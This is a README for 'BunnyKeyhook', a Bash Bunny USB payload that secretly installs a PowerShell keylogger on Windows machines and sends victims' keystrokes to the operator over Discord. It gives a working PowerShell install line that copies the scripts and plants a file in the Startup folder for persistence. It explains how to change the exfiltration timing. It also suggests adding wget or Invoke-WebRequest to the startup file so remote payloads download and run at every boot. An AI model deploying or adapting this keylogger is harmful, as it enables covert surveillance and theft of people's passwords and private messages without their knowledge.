# BunnyKeyhook
> Chris Taylor [Blue Cosmo]
---

```
__________                            ____  __.            .__                   __    
\______   \__ __  ____   ____ ___.__.|    |/ _|____ ___.__.|  |__   ____   ____ |  | __
 |    |  _/  |  \/    \ /    <   |  ||      <_/ __ <   |  ||  |  \ /  _ \ /  _ \|  |/ /
 |    |   \  |  /   |  \   |  \___  ||    |  \  ___/\___  ||   Y  (  <_> |  <_> )    < 
 |______  /____/|___|  /___|  / ____||____|__ \___  > ____||___|  /\____/ \____/|__|_ \
        \/           \/     \/\/             \/   \/\/          \/                   \/   
```

## Overview:
```
BunnyKeyhook is a BashBunny payload that uses PowerShell to log keystrokes. It will send the logs to you via discord. The keylogger almost gives you a "live feed" of their keystrokes through discord. However, you can tweak the timing to get the logs sent to you quick
```
- moves *c.cmd* file to windows startup directory
- *c.cmd* will secretly run *p.ps1*
- *p.ps1* will log keystrokes 
- *l.ps1* will execute *p.ps1* every minue
    - this can be changed to a preferred delay

## Resources:
- [YouTube Video](https://youtu.be/U74QqEa4GRc)
- [YouTube Channel](https://youtube.com/cosmodiumcs)
- [Website](https://cosmodiumcs.com)

## Requirements:
- Windows Target

## Instructions:
Set-Up/Installation
1. in line 17 of *duckyscript.txt*, change change `'BashBunny'` to the name of your Bash Bunny
2. in line 17 *duckyscript.txt*, change `switch1` to switch position that stores the paylaod
    - make sure to replace *all* appearances of `switch1` if you decide to change 
```powershell
STRING $u=gwmi Win32_Volume|?{$_.Label -eq'BashBunny'}|select name;cd $u.name;cp .\payloads\switch1\p.ps1 $env:temp;cp .\payloads\switch1\l.ps1 $env:temp;cp .\payloads\switch1\c.cmd "C:/Users/$env:UserName/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup";cd $env:temp;echo "">"$env:UserName.log";
```

## Log Sending Delay
Changing the delay between log sends
1. in line 12 of *l.ps1*, change `60` to your preferred number of seconds
```powershell
Start-Sleep 60
```

## Extraneous:
The *c.cmd* attack opportunity
```
the c.cmd file runs every startup.
this means an attacker could place a
'wget' or 'Invoke-WebRequest' and have a file
be downloaded from anywhere on the internet onto the computer.
the file would then save in the startup directory,
allowing it to run every startup
```
---
- hope you enjoy the payload!!
- please subscribe to my [YouTube channel](https://youtube.com/cosmodiumcs) :)
